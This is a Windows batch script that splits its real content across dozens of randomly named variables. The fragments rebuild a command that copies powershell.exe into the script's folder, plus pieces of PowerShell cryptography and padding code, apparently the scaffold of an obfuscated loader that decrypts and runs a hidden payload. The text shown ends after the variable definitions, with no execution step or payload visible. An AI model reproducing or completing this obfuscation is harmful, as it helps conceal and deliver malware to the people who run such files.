@echo off
set "AkOwvaOetG=ll"
set "hZMVdaLzyl=co"
set "FTkEpDXnkI=s\"
set "AiqVHDIEAF=\W"
set "PJifMqssez= C"
set "ARJjkoukvZ=.e"
set "MlwnsKJMeb=in"
set "ADwAuVhgIH=32"
set "pBbVKypRkx= /"
set "UZUreuFJki=do"
set "tIQTscjoPO=po"
set "YYtscbgmPl=rS"
set "ItvZdWOrAF=ow"
set "SrrFIHDEdU=\v"
set "EIVaFtaZYn=y "
set "hyGncPItsM=:\"
set "iLbbmyQHjM=nd"
set "uyLAHscFjl=we"
set "kKjjBzdADo=he"
set "pUIJDJpBYi=xe"
set "pHezkoBxLJ=em"
set "YbkFdKQMRX=st"
set "tBUxvXcOuP=he"
set "lubGNBoZRm=we"
set "GWWfWohjiK=Po"
set "rNmoqwwFaE=Sy"
set "vuEDunnCqt=py"
set "yzEbYCwTvT=0\"
set "CKejxhqiSG=ws"
set "emLVUdYEfP=Wi"
set "nvBAWiIyvW=ll"
set "IenGytMpGf=rs"
set "iUtWqKzEkP=1."
set "EAjddpXxHw= %~dp0"
set "JtiUCtQuRN=cd"
set "RXivTLPAuJ=3HWs"
set "aYxrWTyYbk=ptog"
set "cjTBbXDLIt=();$"
set "wLKqlockAP=$BTp"
set "MUiFAmevxc=raph"
set "AABhVOcCgY=ddin"
set "KzPqaXXmme=('da"
set "JWUzrlmCss=UGTu"
set "mXutfLQvpN=$ICY"
set "SXyrsgqVWi=rity"
set "HPhiMdlxUg=Comp"
set "keZorSiHRj=v4Ir"
set "YIgqgYaoBt=wRbp"
set "uNvEwMlNpH=::('"
set "ufAWFBrXgo=bpk."
set "uUzuWTRpdS=g = "
set "oUSMVcJkcX=ptor"
set "efHhLgmnCl=isfL"
set "cdbnojhftB=Obje"
set "OlFBCIdihQ= = $"
set "ajaQTSsepu=iAc "
set "KkpjkKncRe=);$B"
set "XsYfnsYCaG=le  "
set "IArYxGLgxI=, (,"
set "IkrkOEPYUg=l.Pa"
set "OHYWrrtjas=..-1"
set "pdfSIfngnp=join"
set "hCOroBfXKo=n ''"
set "KrSDMcYXaN=in $"
set "SWCGUVhxUU=rans"
set "NOdwZjXPJF=.Len"
set "xKOCBTYvnR=;$yD"
set "JuCRrDpBCj=sGUc"
set "atwFsBrjzt=[Sys"
set "CDfYIVWvcm=ddin"
